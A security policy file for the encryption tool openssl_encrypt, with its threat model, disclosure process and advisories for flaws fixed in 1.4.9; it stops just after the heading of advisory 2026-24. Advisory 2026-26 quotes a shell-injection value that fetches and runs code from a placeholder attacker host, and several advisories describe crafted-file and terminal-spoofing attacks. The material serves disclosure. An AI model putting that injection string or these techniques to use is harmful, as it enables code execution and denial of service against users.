# Security Policy

`openssl_encrypt` is designed with a **Defense in Depth** approach. This file is
the single source of truth for the project's security policy — supported
versions, source-code integrity, cryptographic standards, vulnerability
reporting, and advisories. It lives at the repository root (GitHub Security tab)
and is mirrored to the project wiki by the docs-sync jobs.

## Security Philosophy

Our security model doesn't just focus on data confidentiality but emphasizes
**Metadata Integrity** and **Quantum Resistance**. We believe in transparency;
our cryptographic choices are documented to allow public audit and verification.

## Threat Model & Non-Goals

Stating what the tool defends against — and, just as importantly, what it does
**not** — keeps the security claims elsewhere in this document honest. The
cost/strength estimates in the README and the protections below are only
meaningful within this model.

### Adversary capabilities (assumed)

We assume an adversary who can:

- obtain the **encrypted container** (at rest or in transit) and any number of
  ciphertexts, and store them indefinitely (e.g. "harvest now, decrypt later");
- read, modify, truncate, reorder, or replay the container's **bytes and
  metadata** before it reaches the recipient;
- run **massively parallel** offline guessing against the password/KDF using
  GPU/ASIC clusters (this is why per-guess memory-hardness, not chaining, is the
  load-bearing defense — see the README KDF section);
- access a **future cryptographically-relevant quantum computer** (motivating the
  hybrid PQC layer).

### Protected assets

- **Confidentiality** of the plaintext payload.
- **Integrity / authenticity** of the payload *and* of the metadata bound as AEAD
  associated data (tampering is detected on decrypt; see *Metadata Binding*).
- **Key-recovery resistance** against classical and (via hybrid KEMs) quantum
  attackers, bounded by password strength and KDF parameters.

### Non-goals (explicitly NOT defended)

- **A compromised endpoint.** If the machine running the tool is compromised
  (malware, a hostile OS, a memory-scraping attacker with the process live), the
  password and plaintext are exposed. Secure-memory handling is best-effort
  hardening, not a defense against a privileged local attacker.
- **Traffic analysis & metadata-about-metadata.** File existence, size, count,
  timing, and access patterns are not concealed.
- **Plaintext-length confidentiality.** The standard container does **not** hide
  the plaintext size — ciphertext length leaks plaintext length (minus framing
  overhead). Length-hiding padding is a future consideration (see
  [`openssl_encrypt/docs/FORMAT.md`](openssl_encrypt/docs/FORMAT.md) §17).
- **Side-channels in the host/runtime.** Constant-time behavior cannot be
  guaranteed under CPython (timing, cache, GC, and memory-deallocation
  side-channels are out of scope); we rely on a generic-error policy
  (see *Anti-Oracle Policy*) rather than provable constant-time execution.
- **Supply-chain compromise of the distribution itself.** The integrity tripwire
  (below) detects casual tampering, not a determined supply-chain attacker — see
  the scope note in *Source-Code Integrity Verification*.
- **Foreign-format parsing safety.** Read-only consumption of third-party formats
  (age / OpenPGP) is a distinct, untrusted attack surface and is not covered by
  these guarantees.

## Supported Versions

We take security seriously and provide security updates for the following versions:

| Version | Supported          | End of Life    |
| ------- | ------------------ | -------------- |
| 1.4.x   | :white_check_mark: | TBD            |
| 1.3.x   | :white_check_mark: | TBD            |
| 1.2.x   | :x:                | December 2025  |
| < 1.2   | :x:                | -              |

**Note:** We provide extended security support for both the current major version (1.4.x) and the previous major version (1.3.x). End of life dates will be announced well in advance.

## Source-Code Integrity Verification

Core cryptographic/security source files are covered by a PGP-signed integrity
manifest so tampering can be detected. The manifest is signed by a **dedicated
source-integrity key** (separate from the vulnerability-reporting key below):

- **Source-integrity signing key fingerprint:** `D269D6A5 D6D7CE52 CE1FC71D C2DF2905 9ED65043`
- Key type: Ed25519 (sign-only)

This fingerprint is published here as an **out-of-band reference**. To verify the
source independently, confirm this fingerprint through a channel other than the
repository, then follow `docs/SOURCE_INTEGRITY.md`:

```bash
gpg --verify openssl_encrypt/integrity/manifest.json.asc \
             openssl_encrypt/integrity/manifest.json
```

> The built-in `openssl-encrypt verify-integrity` command is a convenience tripwire,
> not cryptographic proof — the verifier ships in the same package it checks. Only
> manual `gpg` verification against an out-of-band fingerprint is authoritative.
>
> **Scope (what this is *not*).** The signed manifest detects casual or accidental
> tampering of the covered source files after the fact. It is **not** a substitute
> for proper supply-chain integrity — signed/attested release artifacts,
> reproducible builds, and verification of dependencies — and it does not protect
> against an attacker who controls the distribution channel (they can ship a
> matching signature). It also carries an ongoing **maintenance cost**: the
> manifest must be re-signed whenever a covered file legitimately changes, or
> verification produces false alarms. Treat it as defense-in-depth, not as the
> primary supply-chain control.
>
> **Note:** the source-integrity signing key has been rotated from the development
> bootstrap key to the production key generated on a trusted machine (fingerprint
> above); confirm it out-of-band before trusting any verification result.
>
> **Production signing-key fingerprint** — confirm this through an independent channel
> (this repo, the GitLab project page, the maintainer's web-of-trust) before trusting
> any verification result:
>
> ```
> D269D6A5D6D7CE52CE1FC71DC2DF29059ED65043
> ```

## Cryptographic Standards & AEAD

A core requirement of this tool is the cryptographic binding of file metadata
(the JSON header) to the encrypted payload, achieved through **Authenticated
Encryption with Associated Data (AEAD)**.

> The authoritative, byte-level description of the container — including exactly
> which metadata fields are bound as AAD and how they are canonicalized — lives in
> the [On-Disk Format Specification](openssl_encrypt/docs/FORMAT.md) (§6). This policy document
> states intent; FORMAT.md is normative for interoperability.

### Metadata Binding (AAD)

**AEAD algorithms (full AAD binding)** — the Base64-encoded metadata header is
cryptographically bound to the ciphertext via Associated Data:

* **AES-256-GCM**: Standard hardware-accelerated AEAD with AAD binding
* **ChaCha20-Poly1305**: Software-efficient AEAD with AAD binding
* **XChaCha20-Poly1305**: Extended-nonce AEAD with AAD binding
* **AES-256-SIV**: Deterministic AEAD with AAD binding (nonce-misuse resistant)
* **AES-GCM-SIV**: Misuse-resistant AEAD with AAD binding
* **AES-OCB3**: OCB mode AEAD with AAD binding

**Post-Quantum hybrid algorithms** use AEAD ciphers for their symmetric layer:
ML-KEM (512/768/1024, with AES-GCM or ChaCha20-Poly1305), HQC (128/192/256),
MAYO (1/3/5), CROSS (128/192/256), and Kyber (512/768/1024, deprecated naming).
For these: metadata is created before encryption and passed as AAD; any
modification causes authentication failure, and no redundant `encrypted_hash` is
stored.

**Non-AEAD algorithms (hash-based verification):** Fernet (internal HMAC, no AAD
per spec) and Camellia (HMAC-SHA256). For these, `encrypted_hash` is stored in
metadata and verified by hash comparison rather than AAD.

> **Note on Fernet:** Fernet is included for compatibility with the Python
> `cryptography` ecosystem. Payload integrity is guaranteed, but the metadata
> header is not bound to the token via AAD; hash-based verification is used.

## Post-Quantum Cryptography (PQC)

To protect against Cryptographically Relevant Quantum Computers (CRQC), the tool
uses a hybrid KEM (Key Encapsulation Mechanism) layer.

* **Supported algorithms:** ML-KEM, HQC, CROSS, and MAYO.
* **Mechanism:** the PQC secret is fused with a hardened KDF output
  (Argon2id / RandomX) to derive the final session key.

## Anti-Oracle Policy

To mitigate side-channel and padding-oracle attacks, `openssl_encrypt`
implements a strict **generic error policy**:

* Any failure (KDF mismatch, header corruption, or tag-verification failure)
  returns an identical `Decryption Failed` error.
* We do not provide granular error messages that could leak information about
  the internal state of the cryptographic stack.

## Reporting a Vulnerability

We appreciate responsible disclosure of security vulnerabilities. **Do not open a
public GitHub issue for a security report.**

### How to Report

**Preferred Method:** Use GitHub's private security advisory feature
- Go to the repository's **Security** tab → **"Report a vulnerability"**
- Or open one directly: <https://github.com/jahlives/openssl_encrypt/security/advisories/new>

**Alternative Method:** Send an encrypted email
- Email: **tobster@brain-force.ch**
- **Strongly recommended:** use PGP encryption for sensitive details
- PGP Key Fingerprint: `C8E4 C58E 83AB B314 74C0  E108 0271 3C63 792B 8986`
- Key Type: RSA 4096-bit (expires 2029-09-08)
- Download from `keys.openpgp.org` or `gpg --recv-keys C8E4C58E83ABB31474C0E10802713C63792B8986`

Include in your report: a description of the vulnerability, steps to reproduce,
affected versions, potential impact, and any proof-of-concept code.

We are particularly interested in reports concerning:
* Bypassing the AEAD metadata binding
* Flaws in the KDF chain (Argon2id + RandomX fusion)
* Implementation errors in the PQC wrappers

### What to Expect

- **Initial Response:** within 48 hours we acknowledge receipt
- **Status Updates:** every 7 days on our progress
- **Resolution Timeline:** we aim to resolve critical issues within 30 days
- **Disclosure:** we follow coordinated-disclosure practices

### Vulnerability Handling Process

1. **Triage:** verify and assess severity
2. **Fix Development:** develop and test a fix
3. **Release:** release a security patch for supported versions
4. **Announcement:** publish a security advisory with proper credit
5. **CVE Assignment:** critical vulnerabilities receive CVE identifiers

Accepted vulnerabilities are fixed in the next security release, documented in
our advisories, and credited to the reporter (unless anonymity is preferred).
Declined reports receive a detailed explanation and configuration guidance where
relevant.

## Security Advisories

### ADVISORY 2026-37: Decrypt Enforced a Memory Ceiling but No Time Ceiling — Crafted KDF Iteration Counts Pinned the CPU Pre-Authentication — Resolved

**Severity:** Medium · **CWE-400** (Uncontrolled Resource Consumption)
**Affected versions:** all releases with the pre-decryption KDF-cost estimator, up to and including **1.4.8**. **Fixed in 1.4.9** (both the 1.4.x and 1.5.x lines).

**Summary:** the sibling of the pre-authentication memory-DoS fix (gitlab#128). Before deriving a key, decrypt estimates the KDF cost from the file's attacker-controlled metadata and refuses to proceed above an 8 GiB memory ceiling — but it enforced no ceiling on estimated **time**. A crafted file could declare huge KDF iteration counts with tiny memory — for example `argon2 time_cost/rounds = 2**31` with `memory_cost = 8`, or a hash round count of `2**31` — which passes the memory ceiling yet pins a CPU core for an unbounded time **before the password is checked** (estimated ~1600 s for the hash case and ~4×10¹⁶ s for the argon2 case, versus ~4 s for the heaviest shipped preset).

**Impact:** an unauthenticated CPU-exhaustion DoS: a single crafted file makes `decrypt` burn a core for a very long time before any authentication, with no escape in unattended/batch mode and no notice under `--quiet`/`--no-estimate`.

**Fixed in 1.4.9:** a hard time ceiling (`HARD_TIME_CEILING_SECONDS = 120 s`, ~30× the heaviest preset) is enforced alongside the memory ceiling at every decrypt cost-gate (main, asymmetric, and both recovery-slot paths), via a new `enforce_time_ceiling()` that mirrors `enforce_memory_ceiling` — refused unless explicitly overridden with `--allow-high-kdf-cost` or an interactive confirmation, and enforced independently of the `--quiet`/`--no-estimate` display flags so unattended decrypts stay protected. The pre-decryption cost estimator was also corrected to model the memory×time cross-term it previously ignored: Argon2 time now scales with `memory_cost` and scrypt time with the full `N·r·p` work product, closing crafted configs that sat just under the 8 GiB memory ceiling with a modest round count yet ran for hours. Combined with the existing 1,000,000 hash-round schema cap, this catches every iteration- and memory-driven config across all KDFs. Regression-pinned by `test_kdf_time_ceiling_247.py`.

**Mitigation for existing installs:** upgrade to 1.4.9; on earlier versions, do not decrypt untrusted files unattended.

**Disclosure:** tracked as gitlab#247 and GHSA-rv6w-7hq9-pr74 (published with the 1.4.9 release). **Credit:** found by the 1.4.9 pre-release security scan (finding F30).

### ADVISORY 2026-36: File Header Stored an Unkeyed SHA-256 of the Plaintext (Plaintext-Confirmation Oracle) — Resolved

**Severity:** Medium · **CWE-311** (Missing Encryption / Cleartext Storage of Sensitive Information)
**Affected versions:** all releases, up to and including **1.4.8**. **Fixed in 1.4.9** (both the 1.4.x and 1.5.x lines) for newly-written files.

**Summary:** every encrypted file stored `hashes.original_hash = SHA-256(plaintext)` in its **cleartext** metadata header. The hash is unkeyed and readable by anyone who holds the file, without the password.

**Impact:** a **plaintext-confirmation / brute-force oracle** — an attacker who suspects the plaintext, or is brute-forcing a low-entropy plaintext (a PIN, a short message, a file drawn from a known set), can hash their guess and compare it to `original_hash` to confirm a hit entirely offline, with no key. It also fingerprints identical plaintexts across separately-encrypted files. The value was cryptographically redundant: every reachable cipher path already authenticates the plaintext before releasing it (native AEAD tag, Fernet's AES-CBC+HMAC, Camellia's encrypt-then-MAC, the streaming trailer HMAC, or the v7 AES-256-GCM payload under an ML-DSA-65-signed header).

**Fixed in 1.4.9:** the unkeyed plaintext hash is no longer written on any path (symmetric one-shot, streaming, and identity/asymmetric v7); the metadata schemas no longer require it. Decrypt stays tolerant of files written by earlier versions that still carry it — the checks are presence-guarded and simply skipped when it is absent. No keyed replacement was added because the cipher layer already provides plaintext integrity. `encrypted_hash` (a hash over the already-public ciphertext) is not a plaintext oracle and is retained. Regression-pinned by `test_original_hash_oracle_245.py`.

**Mitigation for existing installs:** upgrade to 1.4.9 and **re-encrypt** any sensitive files that were written by an earlier version — the oracle lives in already-written files' headers and is only removed by re-encrypting under 1.4.9+.

**Disclosure:** tracked as gitlab#245 and GHSA-7c3q-gp4v-q29q (published with the 1.4.9 release). **Credit:** found by the 1.4.9 pre-release security scan (finding F8).

### ADVISORY 2026-35: Remote Pepper Was Sealed Under an Unsalted, Non-Memory-Hard Key Derived From the Password — Resolved

**Severity:** Medium · **CWE-916** (Use of Password Hash With Insufficient Computational Effort)
**Affected versions:** all releases with the remote-pepper (keyserver) plugin, up to and including **1.4.8**. **Fixed in 1.4.9** (both the 1.4.x and 1.5.x lines).

**Summary:** the remote pepper — a secret factor stored on the keyserver and mixed into key derivation — was wrapped client-side under an AES-GCM key derived as `HKDF-SHA256(ikm=password, salt=None, info="openssl_encrypt-pepper-key")` for format_version ≥ 12, or bare `SHA-256(password)` for older formats, with no AEAD associated data. Because the HKDF salt was `None` (a zero block), the wrap key was identical for a given password across every user and every file, and the derivation cost was only ~2 SHA-256 per candidate (a single SHA-256 for pre-v12 files). The wrapped blobs are uploaded to and held by the keyserver.

**Impact:** a malicious or compromised remote-pepper server (which holds all wrapped blobs) could precompute a single fleet-wide table and mount an accelerated, salt-free offline dictionary attack on the user password that gates the pepper — running at hardware speed rather than at a memory-hard KDF's cost. Preconditions: the opt-in remote-pepper feature is in use and the server (or the transport) is hostile.

**Fixed in 1.4.9:** new peppers are sealed in a self-describing v2 blob — `magic "OEPPWRP2" || salt(16) || nonce(12) || AES-GCM(ct‖tag)` — whose wrap key is `Argon2id(password, fresh-per-blob random salt)` (memory-hard and unique per blob, defeating both hardware-speed guessing and fleet-wide precompute), with the pepper's server-side name bound as AEAD AAD (so blobs cannot be swapped between names undetected). The Argon2id parameters are fixed by the magic version and are **not** read from the untrusted blob, so a hostile server cannot drive a decrypt-time memory-exhaustion DoS. Peppers written by earlier versions (no magic) remain readable through the legacy path. Regression-pinned by `test_remote_pepper_wrap_kdf_244.py`. **Behavior change:** a pepper written by 1.4.9+ cannot be opened by an older client (forward-incompatible by design).

**Mitigation for existing installs:** upgrade to 1.4.9; re-encrypt files whose peppers were stored by an earlier version to re-seal them under the v2 wrap; only use a remote-pepper server you trust.

**Disclosure:** tracked as gitlab#244 and GHSA-3v63-778v-3mvp (published with the 1.4.9 release). **Credit:** found by the 1.4.9 pre-release security scan (finding F2).

### ADVISORY 2026-34: `verify-usb` Silently Skipped Everything Under a Planted Directory Symlink — Resolved

**Severity:** Medium · **CWE-59** (Improper Link Resolution Before File Access / "Link Following")
**Affected versions:** all releases with the portable-USB integrity feature, up to and including **1.4.8**. **Fixed in 1.4.9** (both the 1.4.x and 1.5.x lines).

**Summary:** the `verify-usb` v2 added-file scan enumerated the drive with `Path.rglob("*")`, which in CPython never descends into a symlinked directory and treats the symlink itself as an ordinary directory entry; the hash side's `O_NOFOLLOW` binds only the final path component. An evil-maid attacker with write access to the drive could replace a tool-tree directory with a symlink to a copy holding byte-identical files plus a planted `__pycache__/*.pyc` (which CPython loads in preference to recompiling the clean `.py`). The manifest-listed files hashed clean through the symlink, the planted file was never enumerated, `added_files` stayed 0, and `verify-usb` reported **PASSED**.

**Impact:** arbitrary code execution when the victim runs the portable install — a forged integrity PASS on a tampered drive. Preconditions: physical/write access to the portable media (the evil-maid threat the integrity feature exists to detect).

**Fixed in 1.4.9:** the scan now enumerates with `os.walk(..., followlinks=False)` and flags **any** symlinked path component (directory or file) as an added/tampered entry; because `integrity_ok` requires `added_files == 0`, a symlink-shrouded planted tree fails verification. A legitimate portable install contains no symlinks, so there are no false positives. Regression-pinned by `test_verify_usb_symlink_tamper_242.py`.

**Mitigation for existing installs:** upgrade to 1.4.9; on earlier versions, do not trust a `verify-usb` PASS on media that left your physical control.

**Disclosure:** tracked as gitlab#242 and GHSA-hw7h-wqf5-6crx (published with the 1.4.9 release). **Credit:** found by the 1.4.9 pre-release security scan (finding F26).

### ADVISORY 2026-33: Keyserver Login/Registration Accepted Non-HTTPS and Unconfigured Server URLs — Resolved

**Severity:** Medium · **CWE-319** (Cleartext Transmission of Sensitive Information)
**Affected versions:** all releases with the keyserver plugin, up to and including **1.4.8**. **Fixed in 1.4.9** (both the 1.4.x and 1.5.x lines).

**Summary:** the keyserver plugin's `register()` enforced `https://`, but `login()` and `register_with_email()` did not, and certificate pinning is only mounted for the `https://` prefix. Setup instructions naming an `http://` URL therefore sent the `client_id` (which alone yields access + refresh tokens), any stored account password, and the returned JWTs in cleartext to an on-path attacker. A wrong-but-`https` host that was not among the configured servers would likewise receive the credentials, because the URL was never checked against `config.servers`.

**Impact:** keyserver account takeover — an attacker who observes (or receives) the leaked `client_id`/tokens can upload or revoke public keys under the victim's identity. Preconditions: the victim uses an `http://` or attacker-chosen server URL (e.g. from malicious setup instructions).

**Fixed in 1.4.9:** a single shared validator (`_validate_server_url`) requires `https://` and membership of `config.servers`, and is applied by `login`, `register`, and `register_with_email` before any request is built — so a failed check means no request is sent and no token is persisted. Regression-pinned by `test_keyserver_url_validation_241.py`.

**Mitigation for existing installs:** upgrade to 1.4.9; on earlier versions, only ever configure and use `https://` keyserver URLs you control.

**Disclosure:** tracked as gitlab#241 and GHSA-xr64-hcxg-4ghr (published with the 1.4.9 release). **Credit:** found by the 1.4.9 pre-release security scan (finding F15).

### ADVISORY 2026-32: FLAC Steganography `total_samples` Drove a Multi-Gigabyte Allocation — Resolved

**Severity:** Medium · **CWE-789** (Memory Allocation with Excessive Size Value)
**Affected versions:** all releases with the FLAC steganography cover format, up to and including **1.4.8**. **Fixed in 1.4.9** (both the 1.4.x and 1.5.x lines).

**Summary:** the 36-bit `total_samples` field from an attacker-supplied FLAC STREAMINFO block was fed into `np.random.randint(size=(total_samples, channels))` in `_decode_flac_samples`. The only guard re-estimated the count when it exceeded 100,000,000, so a value up to ~100M passed: a ~50-byte `fLaC` file declaring ~100M samples allocated a ~400–800 MB array (stereo int32), a same-size `.flatten()` copy, and a multi-gigabyte Python int list — an out-of-memory kill of `decrypt --stego-extract`, with ~10⁸ amplification by input file size.

**Impact:** unauthenticated memory-exhaustion DoS when extracting from an attacker-supplied FLAC carrier. No key disclosure or code execution.

**Fixed in 1.4.9:** `total_samples` is bounded by what the audio payload could actually contain (`audio_byte_count / (channels × bytes_per_sample)`); an out-of-range value is re-estimated from the file size and clamped to a sane range. Regression-pinned by `test_flac_total_samples_bound_240.py`.

**Mitigation for existing installs:** upgrade to 1.4.9; on earlier versions, do not run `--stego-extract` on untrusted FLAC files.

**Disclosure:** tracked as gitlab#240 and GHSA-wr9q-p3rj-vqq7 (published with the 1.4.9 release). **Credit:** found by the 1.4.9 pre-release security scan (finding F14).

### ADVISORY 2026-31: Multi-QR Key Import `total` Field Drove Unbounded Materialization — Resolved

**Severity:** Medium · **CWE-789** (Memory Allocation with Excessive Size Value)
**Affected versions:** all releases with QR key distribution, up to and including **1.4.8**. **Fixed in 1.4.9** (both the 1.4.x and 1.5.x lines).

**Summary:** `_parse_multi_qr_data` took the `total` field verbatim from an untrusted QR JSON payload and never range-checked it before `set(range(1, total + 1))` and `b"".join(parts[i] for i in range(1, total + 1))`. Two attacker-supplied QR images declaring `total = 10**12` made `keystore-cli import-qr` allocate ~10¹² int objects, hanging the process until the OOM killer fired; the import never completed.

**Impact:** unauthenticated memory-exhaustion DoS when importing attacker-supplied QR images. No key disclosure or code execution.

**Fixed in 1.4.9:** `part` and `total` are validated as integers in 1..99 — the same cap the QR *creation* path enforces — immediately after parsing, before any range materialization; a value out of range is rejected. Regression-pinned by `test_qr_multi_part_bound_239.py`.

**Mitigation for existing installs:** upgrade to 1.4.9; on earlier versions, do not import QR images from untrusted sources.

**Disclosure:** tracked as gitlab#239 and GHSA-r23m-gf2m-8www (published with the 1.4.9 release). **Credit:** found by the 1.4.9 pre-release security scan (finding F24).

### ADVISORY 2026-30: `verify-usb` Printed Attacker-Planted Filenames Without Escaping — Resolved

**Severity:** Medium · **CWE-117** (Improper Output Neutralization for terminal)
**Affected versions:** all releases with `verify-usb`, up to and including **1.4.8**. **Fixed in 1.4.9** (both the 1.4.x and 1.5.x lines).

**Summary:** the `verify-usb` command's tampered / missing / added file lists are built from raw path names discovered by scanning the untrusted drive — data outside the AES-GCM authenticated manifest — and were echoed under the FAILED banner with no `sanitize_for_display()`. A planted filename containing cursor-movement / erase-line bytes could repaint a forged "PASSED" verdict on the very command whose job is to report tampering. The command's error path also printed the raw exception (which can embed the user-supplied `--usb-path`).

**Impact:** terminal-output spoofing of the integrity verdict for an attacker-controlled drive. No code execution.

**Fixed in 1.4.9:** every drive-derived filename, and the error-path exception message, are routed through `sanitize_for_display()`. Regression-pinned by `test_verify_usb_display_sanitization_238.py`.

**Mitigation for existing installs:** upgrade to 1.4.9; on earlier versions, do not trust a `verify-usb` PASSED line without inspecting the raw output for embedded control sequences.

**Disclosure:** tracked as gitlab#238 and GHSA-c793-rj9w-r3wg (published with the 1.4.9 release). **Credit:** found by the 1.4.9 pre-release security scan (finding F25).

### ADVISORY 2026-29: Decrypt Auto-Detection Printed an Untrusted key_id Unescaped and Parsed the Header Unbounded — Resolved

**Severity:** Medium · **CWE-117** (Improper Output Neutralization for terminal)
**Affected versions:** all releases with asymmetric decrypt auto-detection, up to and including **1.4.8**. **Fixed in 1.4.9** (both the 1.4.x and 1.5.x lines).

**Summary:** `detect_encryption_type` parsed an encrypted file's header with a bare `json.loads` and returned each `asymmetric.recipients[].key_id`; on the "no matching identity" decrypt path these were printed to stderr with no escaping. Literal cursor-movement / erase-line bytes in a crafted `key_id` could scroll back over the error and paint a forged `Fingerprint:` / verification block — the only out-of-band authenticity readout the design offers. The recipient list was also unbounded.

**Impact:** terminal-output spoofing of the authenticity readout when attempting to decrypt an attacker-supplied asymmetric file, plus an unbounded-materialization/print risk from a crafted recipient list. No code execution.

**Fixed in 1.4.9:** the printed fingerprint is routed through `sanitize_for_display()`; the recipient list read from the header is capped; and the header is parsed through a size/depth/control-character-bounded JSON security scan before `json.loads` (a rejection is treated as "not detected", a safe default). Regression-pinned by `test_detect_encryption_type_hardening_237.py`.

**Mitigation for existing installs:** upgrade to 1.4.9.

**Disclosure:** tracked as gitlab#237 and GHSA-jwfm-99h7-2w5x (published with the 1.4.9 release). **Credit:** found by the 1.4.9 pre-release security scan (finding F3).

### ADVISORY 2026-28: `info` Rendered Untrusted File Metadata Without Escaping Terminal Control Characters — Resolved

**Severity:** Medium · **CWE-117** (Improper Output Neutralization for Logs / terminal)
**Affected versions:** all releases with the `info` command, up to and including **1.4.8**. **Fixed in 1.4.9** (both the 1.4.x and 1.5.x lines).

**Summary:** `print_file_info` (the `info` command) printed metadata fields taken from an untrusted file — `algorithm`, `encryption_data`, `cipher_chain`, `layer_info[].cipher`, `hkdf_hash`, `salt`, the KDF display names and parameters, `original_hash`/`encrypted_hash`, the PQC public key, `hsm_plugin`, `pepper_plugin`, `pepper_name`, and (for crafted legacy v1/v2 files, which skip schema validation) `mode`/`xor_mode`/`encrypted_at` — to the terminal with no `sanitize_for_display()`. The `--json` output likewise used `ensure_ascii=False`. Because the JSON security scan rejects only C0 control bytes, a crafted file could carry C1 (e.g. 0x9B CSI), DEL, or bidi override characters that reached the terminal raw. Cursor-movement / erase-line / bidi bytes in a field let a hostile file repaint the info output — including forging the `Fingerprint:` / verification line — on the command whose purpose is to judge an untrusted file.

**Impact:** terminal-output spoofing when running `info` on an attacker-supplied file: the attacker can rewrite what the tool appears to report about the file, including its authenticity readout. No code execution.

**Fixed in 1.4.9:** every metadata-derived value printed by `print_file_info` (including the reconstructed-CLI lines, and the legacy top-level fields) is routed through `sanitize_for_display()`, which escapes C0/C1/DEL and bidi controls; the `--json` branch now uses `ensure_ascii=True`. Regression-pinned by `test_info_file_info_display_sanitization_236.py`.

**Mitigation for existing installs:** upgrade to 1.4.9; on earlier versions, do not run `info` on untrusted files in a terminal you rely on for verification.

**Disclosure:** tracked as gitlab#236 and GHSA-539p-fxf4-7fv8 (published with the 1.4.9 release). **Credit:** found by the 1.4.9 pre-release security scan (finding F4).

### ADVISORY 2026-27: Legacy GUI Loaded KDF Settings From a CWD-Relative File — Resolved

**Severity:** Medium · **CWE-426** (Untrusted Search Path)
**Affected versions:** all releases with the legacy Tk settings GUI, up to and including **1.4.8**. **Fixed in 1.4.9** (both the 1.4.x and 1.5.x lines).

**Summary:** `crypt_settings.py` defined `CONFIG_FILE` as the absolute per-user path `~/.crypt_settings.json`, but reassigned it a few lines later to the bare relative name `crypt_settings.json`, shadowing it. The legacy Tk GUI's `SettingsTab.load_settings`/`save_settings` therefore read and wrote whatever `crypt_settings.json` file happened to sit in the process's launch directory. A `crypt_settings.json` planted in the working directory (e.g. `sha256: 1` with every memory-hard KDF disabled) silently reduced every file encrypted in that GUI session to roughly one hash round — the weak-KDF preflight did not fire because one hash iteration was present — after which an attacker could brute-force the ciphertext offline.

**Impact:** a key-derivation downgrade to near-zero work factor, reachable by planting a file in a directory the victim launches the legacy GUI from. Confidentiality of everything encrypted that session is lost to offline guessing.

**Fixed in 1.4.9:** the shadowing reassignment is removed, so the settings file always resolves to the absolute per-user path regardless of the working directory. `load_settings` additionally warns loudly when the loaded configuration provides no memory-hard/iterated key stretching (no Argon2/scrypt/balloon/RandomX and no significant hash rounds). Regression-pinned by `test_crypt_settings_config_path_235.py`.

**Mitigation for existing installs:** upgrade to 1.4.9; on earlier versions, launch the GUI from a trusted directory and verify `~/.crypt_settings.json` is the config in effect.

**Disclosure:** tracked as gitlab#235 and GHSA-7j2v-g84w-m75v (published with the 1.4.9 release). **Credit:** found by the 1.4.9 pre-release security scan (finding F34).

### ADVISORY 2026-26: `info` Reconstructed-CLI Block Interpolated Untrusted Metadata Unquoted — Resolved

**Severity:** Medium · **CWE-78** (OS Command Injection via unsafe output)
**Affected versions:** all releases with the `info` reconstructed-CLI output, up to and including **1.4.8**. **Fixed in 1.4.9** (both the 1.4.x and 1.5.x lines).

**Summary:** the `info` command prints a "Reconstructed CLI" block (an `openssl_encrypt encrypt …` command that would reproduce a file's settings), built by `_reconstruct_cli_from_metadata`. It interpolated attacker-controlled metadata fields — `pepper_name`, `hsm_plugin`, `algorithm`, `cipher_chain`, `kdf_config.hkdf.info`, `argon2.type`, `randomx.mode`, and the numeric cost fields — into that shell text with no quoting. A file whose `pepper_name` was, e.g., `work; curl -s http://evil/x | sh #` produced a printed command that executed attacker code the moment the user copied the block into a shell (the block's stated purpose); newline/escape injection in the same output could make the malicious suffix inconspicuous.

**Impact:** command execution on the machine running `info` against an untrusted file — but only after the user pastes the reconstructed command into a shell. It is not executed by the tool itself.

**Fixed in 1.4.9:** every value interpolated into the reconstructed command now passes through `shlex.quote()` (via a `_shq()` helper), so a crafted value — including one containing shell metacharacters or embedded newlines — stays a single, inert shell token. Regression-pinned by `test_info_cli_reconstruction_shell_safety_234.py`, which asserts each crafted value survives `shlex.split` as exactly one token.

**Mitigation for existing installs:** upgrade to 1.4.9; on earlier versions, do not paste the `info` reconstructed-CLI block for an untrusted file into a shell without inspecting it.

**Disclosure:** tracked as gitlab#234 and GHSA-gw2m-mj6q-59hc (published with the 1.4.9 release). **Credit:** found by the 1.4.9 pre-release security scan (finding F35).

### ADVISORY 2026-25: Pre-Authentication Resource Exhaustion via Unbounded KDF Cost in Crafted Files — Resolved

**Severity:** Medium · **CWE-770** (Allocation of Resources Without Limits) / CWE-405 / CWE-1284
**Affected versions:** all releases with the pre-auth memory ceiling, up to and including **1.4.8**. **Fixed in 1.4.9** (both the 1.4.x and 1.5.x lines).

**Summary:** several code paths let a crafted file drive unbounded key-derivation cost past the pre-authentication memory ceiling (gitlab#128), OOM-killing or wedging the process before any password is verified:

- **F9 (CWE-1284):** Balloon `parallel_cost` came verbatim from the file's `balloon.parallelism` and was submitted as that many `ThreadPoolExecutor` tasks; the estimator never modeled parallelism, so a value like 10⁸ allocated ~10⁸ `Future`/`_WorkItem` objects during key derivation.
- **F28 (CWE-770):** the decryption-cost estimator modeled only `derivation_config.kdf_config`, but the executor also honors a `kdf_config` shadowed inside `derivation_config.hash_config` (its keys are flattened and `generate_key_independent_xor` reads `hash_config["derivation_config"]["kdf_config"]`); a crafted v14 file hid an Argon2 `memory_cost` of 1 TiB there and the ceiling saw ~0.
- **F29 (CWE-770):** for legacy v1–v3 files the estimator hard-coded `kdf_config = {}` while the executor honors `hash_config['argon2'|'scrypt'|'balloon']`; a v3 file with `argon2.memory_cost = 128 GiB` estimated ~0.
- **F16 (CWE-405):** the recovery path ran a full Argon2id unlock for every recovery slot (up to the array cap) before the slot-set MAC could reject a tampered set, so a crafted file with many expensive slots exhausted CPU/memory pre-authentication.

**Impact:** unauthenticated denial of service — decrypting an attacker-supplied file (including in `--quiet`/unattended mode) could OOM-kill or hang the host before the password is ever checked. No key disclosure or code execution.

**Fixed in 1.4.9:** Balloon `parallel_cost` is hard-capped in `balloon_m` (fail closed) and modeled in the estimator so the ceiling accounts for it; the estimator now folds in the shadowed (F28) and legacy (F29) KDF configs the executor actually consumes; and the recovery path caps the slot count before any KDF work, enforces the memory ceiling per slot, and lowers the per-slot Argon2 memory cap to 1 GiB (F16). Regression-pinned by `test_predecrypt_dos_cluster_233.py`.

**Mitigation for existing installs:** upgrade to 1.4.9; on earlier versions, avoid decrypting untrusted files on memory-constrained or unattended hosts.

**Disclosure:** tracked as gitlab#233 and GHSA-phmr-p567-q5g6 (published with the 1.4.9 release). **Credit:** found by the 1.4.9 pre-release security scan (findings F9, F16, F28, F29).

### ADVISORY 2026-24: Signature Verification Accepted Revoked and Expired GPG Keys — Resolved

**Severity:** Medium · **CWE-347** (Improper Verification of Cryptographic Signature)
**Affected versions:** all releases using GPG signature verification, up to and including **1.4.8**. **Fixed in 1.4.9** (both the 1.4.x and 1.5.x lines).

